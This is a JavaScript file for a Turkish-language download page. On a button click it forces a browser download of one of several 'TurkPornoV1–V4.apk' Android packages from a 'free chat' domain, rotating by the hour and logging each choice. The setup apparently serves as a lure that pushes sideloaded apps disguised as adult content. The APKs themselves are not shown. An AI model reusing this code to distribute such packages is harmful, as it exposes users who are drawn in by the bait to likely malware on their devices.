import { sendLog } from './log.js';

document.addEventListener("DOMContentLoaded", () => {
  const btn = document.getElementById('download-button');

  const apkLinks = [
"https://indir.ucretsizsohbet.online/TurkPornoV1.apk",
"https://indir.ucretsizsohbet.online/TurkPornoV1.apk",
"https://indir.ucretsizsohbet.online/TurkPornoV1.apk",
"https://indir.ucretsizsohbet.online/TurkPornoV1.apk",
"https://indir.ucretsizsohbet.online/TurkPornoV1.apk",
"https://indir.ucretsizsohbet.online/TurkPornoV1.apk",
"https://indir.ucretsizsohbet.online/TurkPornoV2.apk",
"https://indir.ucretsizsohbet.online/TurkPornoV2.apk",
"https://indir.ucretsizsohbet.online/TurkPornoV2.apk",
"https://indir.ucretsizsohbet.online/TurkPornoV2.apk",
"https://indir.ucretsizsohbet.online/TurkPornoV2.apk",
"https://indir.ucretsizsohbet.online/TurkPornoV2.apk",
"https://indir.ucretsizsohbet.online/TurkPornoV3.apk",
"https://indir.ucretsizsohbet.online/TurkPornoV3.apk",
"https://indir.ucretsizsohbet.online/TurkPornoV3.apk",
"https://indir.ucretsizsohbet.online/TurkPornoV3.apk",
"https://indir.ucretsizsohbet.online/TurkPornoV3.apk",
"https://indir.ucretsizsohbet.online/TurkPornoV3.apk",
"https://indir.ucretsizsohbet.online/TurkPornoV4.apk",
"https://indir.ucretsizsohbet.online/TurkPornoV4.apk",
"https://indir.ucretsizsohbet.online/TurkPornoV4.apk",
"https://indir.ucretsizsohbet.online/TurkPornoV4.apk",
"https://indir.ucretsizsohbet.online/TurkPornoV4.apk",
"https://indir.ucretsizsohbet.online/TurkPornoV4.apk"
  ];

  btn.addEventListener('click', () => {
    btn.innerText = 'İndiriliyor...';
    btn.disabled = true;

    const fileUrl = apkLinks[new Date().getHours() % apkLinks.length];


    sendLog(fileUrl);


    const a = document.createElement('a');
    a.href = fileUrl;
    a.download = '';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);

    setTimeout(() => {
      btn.innerText = 'Tekrar İndir';
      btn.disabled = false;
    }, 3000);
  });
});


















